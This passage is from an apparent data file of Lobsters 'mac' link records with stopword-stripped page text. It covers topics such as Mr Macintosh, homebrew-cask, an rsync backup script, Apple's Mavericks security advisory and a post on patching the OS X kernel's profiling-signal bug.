raincoatmeanwhile hertzfeld programmed rudimentary hook embryonic code would allow easily insert mr macintosh operating system animation character completed animate mr macintosh hertzfeld approached old highschool friend susan kare kare work macintosh operating system would eventually become legendary created series icon still universally recognizable today time though unknown fact work animating mr macintosh according hertzfeld first ever apple strangely kare say actually remember working character although found character sketchbook could possibly pixel art mockup would looked like macintosh menu bar possible sketch mr macintosh susan kareeveryone wanted mr macintosh happen despite though apple finally started shipping original macintosh customer january mr macintosh nowhere seen matter many thousand time row clicked menu bar end day grim practical reality early computing killed mr macintosh uteroaccording hertzfeld ultimately put kibosh mr macintosh original mac paltry kilobyte memory eventually clear never able fit bitmap mr macintosh rom writes hertzfeld ultimately entire macintosh operating system needed refined absolutely musthave feature whimsical little man showed irregularly would make user doubt sanity make cut even hook hertzfeld coded would allow mr macintosh appear still exist mac source code according hertzfeld would possible mac programmer create application system module could conjure mr macintosh character long provided animationsthirty year day original macintosh debut mr macintosh forgotten even computer meant inhabit gone change world easy dismiss mr macintosh strange whim young steve job perhaps seussian character dressed raincoat deserves mr macintosh initial glimmering another job radical idea digital person life inside computer make using fun approachable mr macintosh come clippy rover siri primordial man whose descendant define user interface tomorrow
737,Lobsters,mac,Apple macOS,Stockfish for Mac - Powerful Chess Analysis,http://stockfishchess.org/mac/,stockfish mac powerful chess analysis,feature available github fork stockfish mac github new,feature interactive immersive board stockfish gorgeous board look fantastic retina display full nice touch click drag piece destination square highlighted yellow best move shown red arrow plus go full screen immersive chess experience topnotch chess analysis analysis powered stockfish chess engine strongest free chess engine world getting topnotch analysis surpasses strongest human chess grandmaster advanced feature stockfish many enhancement advanced user browse multigame pgn file copy paste fen string utilize syzygy endgame tablebases use multipv free open source stockfish completely free source code available github license fork stockfish mac github new version updated design given app visual refresh new color scheme dramatically improved animation new toolbar updated engine new stockfish engine elo stronger stockfish speed boost using latest haswell processor multipv sometimes want know best move addition best move enable line analysis engine menu undoredo stockfish warn overwrite game history new move always undo endgame tablebases select folder syzygy endgame tablebases stockfish use analysis tablebases downloaded separately option adjust engine skill level contempt stockfish automatically tweak setting strongest play
738,Lobsters,mac,Apple macOS,OpenEmu - Multiple Video Game System,http://openemu.org/,openemu multiple video game system,take control left right left right b start learn,take control left right left right b start restrict keyboard although requirement openemu best used peripheral gamepad controller interact game via controller preference simply auto magically assign button generic hid compliant usb bluetooth game controller plug gamepad select press start begin adventure learn
739,Lobsters,mac,Apple macOS,homebrew-cask — homebrew for Mac applications binaries,https://github.com/phinze/homebrew-cask,homebrewcask homebrew mac application binary,homebrew cask homebrew let try homebrew learn usagemd contributingmd hackingmd documentation reporting bug ignore guide issue may closed without review search request question wan na chat license bsd clause netbsd license,homebrew cask install drag homebrew cask extends homebrew brings elegance simplicity speed installation management gui macos application atom google chrome providing friendly cli workflow administration macos application distributed binary let try start using homebrew cask need homebrew installed slower brew cask install atom satisfying dependency downloading http downloading http verifying checksum cask atom installing cask atom moving app atomapp applicationsatomapp linking binary apm usrlocalbinapm linking binary atomsh usrlocalbinatom atom successfully installed atom installed one quick command clicking dragging dropping learn find basic documentation using homebrew cask usagemd want contribute cask awesome see contributingmd want hack code also awesome see hackingmd projectrelated detail discussion available documentation reporting bug ignore guide issue may closed without review reporting bug run brew updatereset brew update try command fixall reset state tap ensuring problem outdated setup side issue persists search opening new one find open issue new information add comment find closed issue try solution issue still solved see guide common problem request question wan na chat really rather friendly best place talk project license code bsd clause netbsd license
740,Lobsters,mac,Apple macOS,How I introduced a 27-year-old computer to the web,http://www.keacher.com/1216/how-i-introduced-a-27-year-old-computer-to-the-web/,introduced computer web,order time faster glider still available configuration tyler request flask beautiful soup code tyler,reviving old computer like restoring classic car thrill bringing ancient modern world first real computer mac plus decided bring forward three decade introduce modern web macintosh plus spoiler alert surfing wikipedia lowly machine mac spec pale comparison even kindle mhz cpu mb ram mb hard drive x x pixel blackandwhite screen current desktop pc order time faster even including gpu still mac plus cut computing teeth child introduced c hard drive modem internet yes certain sense mac already internet first via bbs later via lynx dialup shell session nothing quite like erotic literature bps year old never run tcpip stack always dumb terminal net never fullfledged member hard could right wrong everything went smoothly first mom ship computer arrived good condition stored undisturbed basement since plugged external hard drive flipped power switch watched happy mac glow life tiny crt sure hard drive gave groan protest first spun quieted everything seemed stable data intact least first minute far nostalgia lane playing game glider sudden loud pop smell smoke panicked slammed power switch pulled plug take much sniffing find source acrid odor external hard drive stress current year disuse proved much one filter cap external drive power supply cracked xy cap external hard drive power supply fortunately digikey still sold exact cap handy soldering iron day later back business networking accomplish goal needed web browser tcpip stack way connect mac home network web browser relatively easy find thanks guy running longforgotten ftp site dusty corner internet macweb old enough run plus new enough render html speak http sort get minute whole mb ram play good thing macweb required mb likewise mactcp existed version barely able run system support nicety like dhcp macweb happy use installed without problem tcpip stack getting mac physically hooked network bigger challenge mac plus ethernet port thing like wifi year invented manufactured couple company made scsitoethernet adapter year ago rare expensive thought problem occurred could channel early day could use serial port ppp slip bridge outside world like dialup without modem set raspberry pi ran router using level shifter variety old adapter managed get serial cable working pi mac took care hardware software side scrounged around several failed attempt found ppp client would run plus supersimple ppp server called slirp pi documentation combination mactcp macppp slirp surprisingly still available bit tinkering configuration able get mactcp talk macppp macppp talk slirp slirp use ethernet connection router internet since serial io mac plus processorintensive throughput limited kbit lot higher raspberry pi heavy lifting computer ten thousand time slower mess upper right level shifter null modem adapter serial cable might wondering wait get abandonware first place good question mac floppy drive old enough fundamentally incompatible pc drive floppy drive modern computer anyway tried going avenue mb zip disk since zip drive made usb version manage get mac use zip disk fact switched one primary boot drive even got window pc reading hf formatted disk using nifty tool every attempt move data pc plus resulted nothing corrupted file zip disk left serial port happened old terminal emulator called microphone already installed mac microphone supported zmodem file transfer probably nodding head remember bbs thus transfer file mac sftped questionably legal file needed pc onto raspberry pi plugged pi serial port fired microphone mac terminal launched minicom pi mac nervously struck key initiate zmodem transfer minicom selected file hit enter minicom obliged beep save incoming file dialog popped mac unbinhexing later found running new software old plus huzzah raspberry pi mactcp macweb place time surf web right right surfing yet macweb developer apparently took look http spec decided would ever need namebased virtual hosting left feature site modern web relied support virtual hostnames meant got whatever saw used server ip address alone http request site jack squat oh http cooky cs invented yet aaargh vented problem tyler mentioned long stretch coding solve surprised whipped filtering proxy solution minute using python request flask beautiful soup update code tyler key macweb would include full url hostname making proxy request request fetched url stripped ssl managed cooky beautifulsoup stripped thing macweb understand like cs javascript image divs flask pulled proxy duty reading request sending filtered result back mac friend sufficient surf web even looked surprisingly decent almost like mobile browser mac plus wikipedia page viewed mac plus hacker news viewed mac surprisingly readable given macweb support cs sure slow hell worked data loaded page rendered link clickable even form sort worked mention slow slow soooo sloooow slow slow slow like minute read render page slow video showing slow video whatever goal simply introduce mac web meetandgreet successful
741,Lobsters,mac,Apple macOS,Mac Intrusion Detection Analysis System,https://github.com/etsy/MIDAS,mac intrusion detection analysis system,join github today sign file permalink resource reload reload,repository archived owner readonly mac intrusion detection analysis system dismiss join github today github home million developer working together host review code manage project build software together sign file permalink failed load latest commit information type name latest commit message commit time mac intrusion detection analysis system resource perform action time signed another tab window reload refresh session signed another tab window reload refresh session
742,Lobsters,mac,Apple macOS,GTFO of my menu bar,http://zacbowling.com/menu-bar?lobsters,gtfo menu bar,stand moving unannounced giving easy preference option kill damn icon macmenubars bartender,november seriously apps space trespassing mind install app add menu running mind sticking around expectation usefulness running background im client syncing tool quick access hardware feature etc stand moving unannounced giving easy preference option kill damn icon seems useless apps feature usually bundled bigger apps like updaters also one seem want move use hell look looking people care space valuable real estate one old favorite tumblr macmenubars people display menu bar link apps deemed worthy showcasing valuable apps like bartender exist help get control sacred space think developer would get hint want menu bar follow simple rule easy kill provide retina icon year already since rmbp came provide black icon option enable apple make colorful icon except keyboard switcher kudos kudos
743,Lobsters,mac,Apple macOS,OS X Hardening: Securing a Large Global Mac Fleet,https://www.usenix.org/conference/lisa13/os-x-hardening-securing-large-global-mac-fleet,o x hardening securing large global mac fleet,support usenix presentation audio,open access mediausenix committed open access research presented event paper proceeding freely available everyone event begin video audio andor slide posted event also free open everyone support usenix commitment open access bibtex conference title o x hardening securing large global mac fleet year address washington dc publisher usenix association month nov presentation audio
744,Lobsters,mac,Apple macOS,Time Machine-style backup with rsync,https://github.com/laurent22/rsync-time-backup,time machinestyle backup rsync,rsync time backup installation usage feature example backup expiration logic exclusion file tutorial builtin lock rsync option automatic backup expiration restore extension rtbwrapper timetravel todo http license,rsync time backup script offer time machinestyle backup using rsync creates incremental backup file directory destination choice backup structured way make easy recover file point time work linux macos window via wsl cygwin main advantage time machine flexibility backup fromto filesystem work platform also backup example truecrypt drive without problem macos disadvantage compared time machine particular autostart backup drive plugged though achieved using launch agent requires knowledge command line specific gui provided restore file instead file restored using file explorer including finder command line installation git clone http usage usage rsynctmbackupsh option user host source user host destination excludepatternfile option p port ssh port h help display help message rsyncgetflags display default rsync flag used backup rsyncsetflags set rsync flag going used backup logdir set log file directory flag set generated file managed script particular automatically deleted strategy set expiration strategy default mean one day keep one backup per day day keep one backup every day day keep one backup every day noautoexpire set option disable automatically purging old backup space feature backup folder named current timestamp file copied restored directly without intermediate tool backup tofrom remote destination ssh file nt changed one backup next hardlinked previous backup take little extra space safety check backup happen destination explicitly marked backup destination resume feature backup failed interrupted tool resume next backup exclude file support patternbased exclusion via excludefrom rsync parameter automatically purge old backup within hour backup kept within one month recent backup day kept previous backup recent month kept latest symlink point latest successful backup example backup home folder backupdrive rsynctmbackupsh home mntbackupdrive backup exclusion list rsynctmbackupsh home mntbackupdrive excludedpatternstxt backup remote drive ssh port rsynctmbackupsh p home user examplecom mntbackupdrive backup remote drive ssh rsynctmbackupsh user examplecom home mntbackupdrive mimic time machine behaviour cron script setup backup regular interval example following cron job check drive mntbackup currently connected start backup check every hour grep q mntbackup procmounts rsynctmbackupsh home mntbackup fi backup expiration logic backup set automatically deleted following simple expiration strategy defined strategy flag strategy series time interval item defined x mean x day keep one backup every day default strategy mean day keep one backup every day day keep one backup every day day keep one backup every day first interval ie default within first implied backup set kept additionally backup destination directory full oldest backup deleted enough space available exclusion file optional exclude file provided third parameter compatible excludefrom parameter rsync see tutorial information builtin lock script designed one backup operation active given directory new backup operation started another still active ie finished yet new one automaticalled interrupted thanks use flock run script necessary rsync option display rsync option used backup run rsynctmbackupsh rsyncgetflags also possible add remove option using rsyncsetflags option example exclude backing permission group rsynctmbackup rsyncsetflags numericids link hardlinks onefilesystem archive noperms nogroups itemizechanges src dest automatic backup expiration option disable default behaviour purge old backup space option set noautoexpire flag restore script creates backup regular directory simply copy file back original directory could something like rsync ap pathtolastbackup pathtorestoreto consider using dryrun option check exactly going copied use delete also want delete file exist destination backup obviously extra care must taken using option extension rtbwrapper allows creating backup profile config file handle backup restore operation timetravel smooth integration osx notification center todo check source destination filesystem df dest one fat use modifywindow rsync parameter see man rsync value add wholefile argument window see http minor change see todo comment source license mit license mit copyright c laurent cozic permission hereby granted free charge person obtaining copy software associated documentation file software deal software without restriction including without limitation right use copy modify merge publish distribute sublicense andor sell copy software permit person software furnished subject following condition copyright notice permission notice shall included copy substantial portion software software provided without warranty kind express implied including limited warranty merchantability fitness particular purpose noninfringement event shall author copyright holder liable claim damage liability whether action contract tort otherwise arising connection software use dealing software
745,Lobsters,mac,Apple macOS,About the security content of OS X Mavericks v10.9,http://support.apple.com/kb/HT6011,security content o x maverick,security content o x maverick apple product security use apple product security pgp key cve id apple security update o x maverick application firewall app sandbox bluetooth cfnetwork cfnetwork ssl console coregraphics coregraphics coregraphics curl dyld iokituser ioserialfamily kernel kernel kernel kernel kernel kernel kernel kernel kernel kernel kext management launchservices libc mail account mail header display mail networking openldap perl power management python http wwwpythonorgdownloadreleases python http wwwpythonorgdownloadreleases ruby security security authorization security smart card service screen lock screen lock screen sharing server syslog usb note contact vendor,security content o x maverick document describes security content o x maverick protection customer apple disclose discus confirm security issue full investigation occurred necessary patch release available learn apple product security see apple product security website information apple product security pgp key see use apple product security pgp key possible cve id used reference vulnerability information learn security update see apple security update o x maverick application firewall impact socketfilterfw blockapp may block application receiving network connection description socketfilterfw command line tool blockapp option properly block application receiving network connection issue addressed improved handling blockapp option cveid alexander frangis popcap game app sandbox impact app sandbox may bypassed description launchservices interface launching application allowed sandboxed apps specify list argument passed new process compromised sandboxed application could abuse bypass sandbox issue addressed disallowing sandboxed application specifying argument cveid friedrich graeter soulmen gbr bluetooth impact malicious local application could cause unexpected system termination description bluetooth usb host controller deleted interface needed later operation issue addressed retaining interface longer needed cveid stefano bianchi mazzone mattia pagnozzi aristide fattori computer network security lab laser università degli studi di milano cfnetwork impact session cooky may persist even resetting safari description resetting safari always delete session cooky safari closed issue addressed improved handling session cooky cveid graham bennett rob ansaldo amherst college cfnetwork ssl impact attacker could decrypt part ssl connection description tl version ssl used version subject protocol weakness using block cipher maninthemiddle attacker could injected invalid data causing connection close revealing information previous data connection attempted repeatedly attacker may eventually able decrypt data sent password issue addressed enabling tl cveid console impact clicking malicious log entry may lead unexpected application execution description update modified behavior console clicking log entry attached url rather opening url console preview url quick look cveid aaron sigel vttycom coregraphics impact window may visible lock screen display sleep description logic issue existed coregraphics handling display sleep mode resulting data corruption could result window visible lock screen issue addressed improved handling display sleep cveid coregraphics impact viewing maliciously crafted pdf file may lead unexpected application termination arbitrary code execution description buffer underflow existed handling pdf file issue addressed improved bound checking cveid dormann certcc coregraphics impact unprivileged application may able log keystroke entered application even secure input mode enabled description registering hotkey event unprivileged application could log keystroke entered application even secure input mode enabled issue addressed additional validation hotkey event cveid curl impact multiple vulnerability curl description multiple vulnerability existed curl serious may lead arbitrary code execution issue addressed updating curl version cveid dyld impact attacker arbitrary code execution device may able persist code execution across reboots description multiple buffer overflow existed dyld opensharedcachefile function issue addressed improved bound checking cveid stefan esser iokituser impact malicious local application could cause unexpected system termination description null pointer dereference existed iocatalogue issue addressed additional type checking cveid estes ioserialfamily impact executing malicious application may result arbitrary code execution within kernel description bound array access existed ioserialfamily driver issue addressed improved bound checking cveid kernel impact use digest function kernel may result unexpected system termination description incorrect output length used family digest function resulting kernel panic function used primarily ipsec connection issue addressed use expected output length cveid christoph nadig lobotomo software kernel impact kernel stack memory may disclosed local user description information disclosure issue existed msgctl segctl apis issue addressed initializing data structure returned kernel cveid kenzley alphonse kenx technology inc kernel impact local user may cause denial service description kernel random number generator would hold lock satisfying request userspace allowing local user make large request hold lock long period time denying service user random number generator issue addressed releasing reacquiring lock large request frequently cveid jaakko pero aalto university kernel impact local unprivileged user may able cause unexpected system termination description integer sign issue existed handling tty read issue addressed improved handling tty read cveid cesg kernel impact local user may able cause kernel memory information disclosure unexpected system termination description bound read issue existed handling macho file issue addressed improved bound checking cveid kernel impact local user may able cause unexpected system termination description kernel would panic invalid usersupplied iovec structure detected issue addressed improved validation iovec structure cveid cesg kernel impact unprivileged process may able cause unexpected system termination arbitrary code execution kernel description memory corruption issue existed handling argument posixspawn api issue addressed improved bound checking cveid stefan esser kernel impact source specific multicast program may cause unexpected system termination using wifi network description error checking issue existed handling multicast packet issue addressed improved handling multicast packet cveid octoshape kernel impact attacker local network cause denial service description attacker local network send specially crafted icmp packet cause high cpu load issue addressed rate limiting icmp packet verifying checksum cveid marc heuse kernel impact malicious local application could cause system hang description integer truncation issue existed kernel socket interface could leveraged force cpu infinite loop issue addressed using larger sized variable cveid cesg kext management impact unauthorized process disable loaded kernel extension description issue existed kext management handling ipc message unauthenticated sender issue addressed adding additional authorization check cveid rainbow prism launchservices impact file could show wrong extension description issue exited handling certain unicode character could allow filename show incorrect extension issue addressed filtering unsafe unicode character display filename cveid jesse ruderman mozilla corporation stephane sudre intego libc impact unusual circumstance random number may predictable description kernel random number generator accessible srandomdev function fell back alternative method removed optimization leading lack randomness issue addressed modifying code correct optimization cveid xi wang mail account impact mail may choose secure authentication method available description autoconfiguring mail account certain mailservers mail app would choose plaintext authentication authentication issue addressed improved logic handling cveid mail header display impact unsigned message may appear validly signed description logic issue existed mail handling unsigned message nevertheless contained multipartsigned part issue addressed improved handling unsigned message cveid michael roitzsch technische universität dresden mail networking impact information may briefly transferred plain text nontls encryption configured description kerberos authentication enabled transport layer security disabled mail would send unencrypted data mail server leading unexpected termination connection issue addressed improved handling configuration cveid richard e silverman wwwqoxpnet openldap impact ldapsearch command line tool honor minssf configuration description ldapsearch command line tool honor minssf configuration could lead weak encryption allowed unexpectedly issue addressed improved handling minssf configuration cveid perl impact perl script may vulnerable denial service description rehash mechanism outdated version perl may vulnerable denial service script use untrusted input hash key issue addressed updating perl cveid power management impact screen lock may engage specified time period description locking issue existed power assertion management issue addressed improved lock handling cveid david herman sensible db design python impact multiple vulnerability python description multiple vulnerability existed python serious may lead decryption content ssl connection update address issue updating python version information available via python site http wwwpythonorgdownloadreleases cveid python impact multiple vulnerability python description multiple vulnerability existed python serious may lead decryption content ssl connection update address issue updating python version applying patch python project information available via python site http wwwpythonorgdownloadreleases cveid ruby impact attacker privileged network position may intercept user credential sensitive information description hostname validation issue existed ruby handling ssl certificate issue addressed updating ruby version cveid security impact support certificate hash may expose user spoofing information disclosure attack improve description certificate signed using hash algorithm accepted o x algorithm known cryptographic weakness research misconfigured certificate authority could allowed creation certificate attacker controlled value would trusted system would exposed based protocol spoofing man middle attack information disclosure update disables support certificate hash use trusted root certificate cveid security authorization impact administrator security preference may respected description require administrator password access system preference lock icon setting allows administrator add additional layer protection sensitive system setting case administrator enabled setting applying software update upgrade could subsequently disabled setting issue addressed improved handling authorization right cveid greg onufer security smart card service impact smart card service may unavailable certificate revocation check enabled description logic issue existed o x handling smart card certificate revocation check issue addressed improved certificate revocation support cveid yongjun jeon centrify corporation screen lock impact lock screen command may take effect immediately description lock screen command keychain status menu bar item take effect require password amount time sleep screen saver begin setting elapsed cveid michael kisor organicorbcom christian knappskog ntnu norwegian university science technology stefan grönke ccc trier patrick reed screen lock impact hibernated mac autologin may require password wake description mac hibernation autologin enabled may allow waking hibernation without prompting password issue addressed improved lock handling cveid levi muster screen sharing server impact remote attacker may able cause arbitrary code execution description format string vulnerability existed screen sharing server handling vnc username cveid silentsignal working idefense vcp syslog impact guest user may able see log message previous guest description console log visible guest user contained message previous guest user session issue addressed making console log guest user visible administrator cveid svens porst earthlingsoft usb impact malicious local application could cause unexpected system termination description usb hub controller nt check port port number request issue addressed adding check port port number cveid stefano bianchi mazzone mattia pagnozzi aristide fattori computer network security lab laser università degli studi di milano note o x maverick includes safari incorporates security content safari detail see security content safari http information product manufactured apple independent website controlled tested apple provided without recommendation endorsement apple assumes responsibility regard selection performance use thirdparty website product apple make representation regarding thirdparty website accuracy reliability contact vendor additional information published date january
746,Lobsters,mac,Apple macOS,How Apple Makes the Mac Pro,http://atomicdelights.com/blog/how-apple-makes-the-mac-pro,apple make mac pro,big story mac pro deep draw stamping,product designer one favorite part new apple product launch inevitable made video mac pro incarnation disappoint make apple fascinating using wizbang alien technology make thing even portland oregon technology apple show video inpractice across numerous local factory make apple unique perform manufacturing remarkable precision scale simply astonishing using technique typically reserved aerospace medical device industry big story mac pro deep draw stampingwhen uncle phil said apple using technology new make mac pro brunt statement focused cylindrical case machine formed apple using process known hydraulic deep draw stampingmost metal stampings go one two die tool produce final shape mac pro though challenge produce massive amount plastic deformation without tearing rippling deforming perfect cylindrical surface enclosure drawn series dy progressively stretch aluminum something approaching final shape mac prodeep drawing process efficiently produce net shape part apple could chucked giant hunk aluminum lathe created part amount metal removal extremely inefficient deep drawing efficiently creates hunk metal close final shape mac pro couple operation mac pro enclosure lathe turned clean surface achieve desired tolerance polished placed back machining center produce io power button chamfer feature finally anodized
747,Lobsters,mac,Apple macOS,Apple Special Event October 2013,http://www.apple.com/apple-events/october-2013/,apple special event october,apple special event,apple special event june announcing upgraded operating system iphone ipad mac apple watch apple tv
748,Lobsters,mac,Apple macOS,"Ditch Windows, Become a Polyglot",http://blog.ponyfoo.com/2013/10/10/ditch-windows-become-a-polyglot,ditch window become polyglot,log site window window window do sucked runuo c get paid c frontpage c absolutely godawfully useless powershell c c new order reviewed article one book nodejs became pet project macbook pro c visual studio ide extremely ubuntu repository github damn sure change worth,angelfirepng retrospect one visited either completely honest eventually understanding web evolved started reading php spare time mean let people well really log site like big name whoa learned php one day became tired nonsense decided going write game turned designing game reasonable either error resume next seem helping lot managed anyways read game development followed tutorias soon enough setting first game loop complete menu screen tilemap well frame worth character clearly took design graphic though sketching paint seemed suffice time looking back immensely regret careful backing code child would awesome code never saw light day learnt version control sooner price kid around loved spend time typing thing keyboard window window window never really paid attention linux kid definitely afford mac time heard linux impression terminal linux want go back doslike interface do sucked stuck window programming php know better catstuckinwindowjpg later became friend owner game played daily basis game server fork open source project called runuo almost matter fate explained falling programmer asked could take look one script meaning put together quest idea even know c gave shot time ended becoming contributor project one point even learned people could get paid coding c started working language dearly loved happier worked c year spent year working runuo project worked moved closer closer web loved much younger time came prepared merely frontpage anymore c real deal still commandline complete stranger cmd come bundled window absolutely godawfully useless want get anything done solely typing actually start using terminal choice simply good graphical git interface started bash used moving powershell repelled commandline thoroughly enjoyed moving mouse around right clicking thing picking option menu c taught lot architecture application design general however architecture fanatic ended becoming heart always web started moving towards frontend preoccupying web matter little c become avid terminal user change new order around year ago bought variety book reviewed article ux architecture best practice one book completely changed developer among valuable insight author prompted get comfort zone learn new language picked nodejs even though idea sure sounded interesting decided start working something right away blog became pet project learning node wonderful experience become part daily work much like c tremendous difference however node biased towards window forced actually learn happens cover compare abstraction c u abstraction even though powerful end obscuring fundamental aspect program hindering sustained learning u thirst knowledge first started working node still windowsinfected user dreaded idea typing commandline already powershell p user using dealing git enough thank setting p unfortunately pretty much good get window yet complete nightmare window user completely unaware commandline even type node app commandline time went started using npm module written complete stranger opensource community started becoming whole different level appealing needed get involved yet lot package trying use careful enough conform window upsidedown o design started becoming disenchanted window even though recently acquired early rtm version window loving stupid commandline got job working node even though show blog hand forced pick old era macbook pro work rather pc reason simply enough get application work window moved soon afterwards start becoming apparent missing started using terminal heavily ever done window loving idea able anything without download yet another program important part came bundled download thing another part o even realized curling greping seding piping way around command line greatly improving productivity thoroughly enjoyed installing package right commandline npm opposed click thing nuget case c dealing unreasonably casesensitive command p barely even knowing alternative compile pressing visual studio ide difference window everyone else really learn much development microsoft imposes even craving learning anything aware constraint sure hell saying learnt extremely far ditching window opened eye endless world possibility even know existed besides able pas environment variable process like node app terminal good pas couple day ago decided install ubuntu pc one first thing create file place step taken set environment eventually created repository github repeat installing ubuntu never feasible option window least might taken year damn sure change worth
749,Lobsters,mac,Apple macOS,Announcing OpenZFS,http://www.open-zfs.org/wiki/Announcement,announcing openzfs,active development company matt ahrens http openzfsorg documentation mailing list share code people participate distribution company mailing list project documentation openzfs,openzfs launch announcement september today announce openzfs truly open source successor zfs project zfs world advanced filesystem active development decade recent development continued open openzfs new formal name open community developer user company improving using building zfs founded member linux freebsd mac o x illumos community including matt ahrens one two original author zfs openzfs community brings together hundred software developer platform read openzfs website http openzfsorg nt forget dash openzfs community goal raise awareness quality utility availability openzfs consolidating documentation developer sysadmins alike engaging larger tech community conference meetups online interaction encourage open communication ongoing effort improve open source openzfs creating collaborative website mailing list discus openzfs code change ensure consistent reliability functionality performance distribution openzfs making easier share code platform creating crossplatform test encouraging crossplatform code review dozen people helped define openzfs goal create openzfsorg website many way participate openzfs use openzfs openzfs available several operating system distribution including freebsd omnios illumos debian gentoo pcbsd mac o x making product based openzfs good company dozen company talking openzfs help make product great contact admin openzfsorg get logo openzfsorg company list tshirts write code openzfs contribute platform repo join developer openzfsorg mailing list stay informed openzfs project get design help feedback code change contribute growing body documentation openzfsorg website share experience openzfs blogging tweeting openzfs speaking conference user group openzfs advanced filesystem world join community part making even better
752,Lobsters,mac,Apple macOS,Hacking the OS X Kernel for Fun and Profiles,http://research.swtch.com/macpprof,hacking o x kernel fun profile,hacking o x kernel fun profile build userlevel cpu profiler unix signal thread profiling signal simple c test program o x signal delivery kernsigc apple bug report patching kernel using patch codegooglecomprsccmdpprofmacfix reading ksplice automatic rebootless kernel update,hacking o x kernel fun profile posted tuesday august last post described userlevel cpu profilers work specifically google pprof profiler gather cpu profile help operating system specific feature needed operating system profiling timer provided setitimer sigprof signal delivers operating system implementation feature work profiler work post look common bug unix implementation profiling signal fix o x applied editing o x kernel binary read build userlevel cpu profiler might want start unix signal thread earlier post referred profiling program without mention process thread unix general sigprof particular predate idea thread sigprof originated release berkeley unix published unix time process single thread execution thread come easily unix early implementation slow buggy best avoided popular unix variant added thread support independently many shared mistake even get implementation many original unix apis incompatible idea thread multithreaded process allow multiple thread execution single process address space unix maintains much perprocess state kernel author must decide whether piece state remain perprocess change perthread example single process stack must split perthread stack impossible independently executing thread running single stack many thread thread stack tend smaller one big process stack nonthreaded unix program result important define separate stack running signal handler setting perthread reason ordinary stack perthread choice handler perprocess file descriptor perprocess one thread might open file moment another thread fork exec new program order open file inherited new program must introduce new variant open open file descriptor atomically marked close exec open every system call creates new file descriptor need variant creates file descriptor close exec memory perprocess malloc must use lock serialize access independent thread one thread might acquire malloc lock moment another thread fork exec new program fork make new copy current process memory including locked malloc lock copy never see unlock thread original program child fork longer use malloc without occasional deadlock tip iceberg lot change make easy miss one profiling signal threadrelated change easy miss goal profiling signal enable userlevel profiling signal sent response program using certain amount cpu time specifically multithreaded kernel profiling signal sent hardware timer interrupt thread timer interrupt handler find execution thread caused thread process profiling timer expire order profile code whose execution triggered timer profiling signal must sent thread running signal sent thread running profile record idleness blocked io sleeping execution neither accurate useful modern unix kernel support sending signal process case delivered arbitrary thread specific thread kill sends signal process pthreadkill sends signal specific thread within process unix thread code delivered profiling signal looked like psignal p sigprof psignal clearer name implementation kill system call p process timer expired one thread per process delivering signal process possibly deliver wrong thread multithreaded program sigprof must delivered running thread kernel must call internal equivalent pthreadkill kill freebsd linux deliver profiling signal correctly empirically netbsd openbsd o x simple c test program without correct delivery profiling signal impossible build correct profiler o x signal delivery apple credit o x kernel source published open source look closely buggy o x implementation profiling signal delivered function bsdast file kernsigc relevant bit code void bsdast threadt thread proct p currentproc timerisset p pvtimerprofitvalue microsecs taskvtimerupdate p task taskvtimerprof microsecs itimerdecr p p pvtimerprof microsecs timerisset p pvtimerprofitvalue taskvtimerset p task taskvtimerprof else taskvtimerclear p task taskvtimerprof psignal p sigprof bsdast function bsd half o x timer interrupt handler profiling enabled bsdast decrement timer sends signal timer expires innermost statement resetting timer state setitimer allows oneshot periodic timer predicted code sending profiling signal process current thread function psignaluthread defined source file sends signal instead specific thread one possible fix simple change psignal psignaluthread filed report bug apple bug report march bug persisted subsequent release o x report suggested different fix inside implementation psignal changing psignal psignaluthread even simpler let patching kernel possible rebuild o x kernel released source however know whether source complete know configuration need use recreate kernel machine confidence end kernel appropriate computer since fix simple possible modify standard o x kernel binary directly binary life machkernel o x computer run gdb machkernel see compiled machine code bsdast find section care gdb machkernel gdb disa bsdast dump assembler code function bsdast push rbp mov rsp rbp timerisset p pvtimerprofitvalue cmpq jne cmpl je taskvtimerset p task taskvtimerprof mov rdi mov esi callq taskvtimerset jmp taskvtimerclear p task taskvtimerprof mov rdi mov esi callq taskvtimerclear psignal p sigprof mov rdi xor esi esi xor edx edx xor ecx ecx mov callq annotated assembly corresponding c code italic final sequence odd call psignal instead call code byte beyond start threadsignal function going psignal thin wrapper around psignalinternal wrapper inlined since psignalinternal static function appear kernel symbol table gdb know name definition psignal psignaluthread void psignal proct p int signum psignalinternal p null null signum static void psignaluthread threadt thread int signum psignalinternal procnull tasknull thread psigthread signum constant expanded call seeing psignalinternal p call want turn psignalinternal thread need prepare different argument list unfortunately thread variable passed bsdast register since longer needed function register reused purpose thread gone fortunately bsdast one invocation kernel bsdast currentthread reconstruct value calling currentthread unfortunately room byte insert call still prepare argument fortunately optimize bit preceding code make room notice call taskvtimerset taskvtimerclear passing argument list argument list prepared side conditional timerisset p pvtimerprofitvalue cmpq jne cmpl je taskvtimerset p task taskvtimerprof mov rdi mov esi callq taskvtimerset jmp taskvtimerclear p task taskvtimerprof mov rdi mov esi callq taskvtimerclear psignal p sigprof mov rdi xor esi esi xor edx edx xor ecx ecx mov callq pull call setup conditional eliminating one copy giving nine byte use delivering signal call currentthread would take five byte moving result appropriate register would take two nine plenty fact since nine byte inline body single ninebyte mov change store result correct register directly avoids needing prepare positiondependent call instruction final version mov rdi mov esi cmpq jne cmpl je callq taskvtimerset jmp callq taskvtimerclear xor edi edi xor esi esi mov rdx mov ecx mov callq found duplicate call setup factor another possible approach would factor two similar code block handling sigvtalrm sigprof single subroutine sitting middle bsdast function code call twice removing second copy code would leave plenty space longer psignaluthread call setup code using o x mountain lion version o x bug relevant bit bsdast changed version version although compiler therefore generated code change even basic pattern fixed kind rewrite using patch use go c gperftools want accurate cpu profile o x packaged binary patcher codegooglecomprsccmdpprofmacfix handle o x snow leopard lion mountain lion o x maverick need fix see reading binary patching old venerable technique simple instance liked reading may also like read jeff arnold paper ksplice automatic rebootless kernel update ksplice construct binary patch linux security vulnerability apply fly running system
